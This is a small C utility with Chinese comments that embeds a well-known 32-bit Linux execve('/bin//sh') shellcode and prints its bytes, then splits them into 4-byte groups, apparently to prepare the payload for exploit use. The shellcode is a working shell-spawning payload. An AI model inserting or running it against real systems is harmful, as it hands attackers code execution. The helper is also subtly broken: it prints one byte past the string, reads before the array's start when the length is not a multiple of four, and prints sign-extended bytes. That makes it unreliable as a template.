#include <stdio.h>
#include <string.h>

char shellcode[] = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80";



void printShellcode(char *shellcode, int length){
	int i = 0;
	for(i = 0; i < length; i++){
		printf("\\x%2x", shellcode[i]);	
	}
}

int main(){

	printShellcode(shellcode, 22);
	int length = strlen(shellcode); // 获取shellcode的长度
	// 从后往前 , 逐 4 字节进行处理
	int i = 0;
	for (i = 0; i < length; i+= 4){
		char byteH = shellcode[length - 4 - i];
		char byteMH = shellcode[length - 3 - i];
		char byteML = shellcode[length - 2 - i];
		char byteL = shellcode[length - 1 - i];
		printf("[%2x][%2x][%2x][%2x]\n", byteH, byteMH, byteML, byteL);	
	}


}
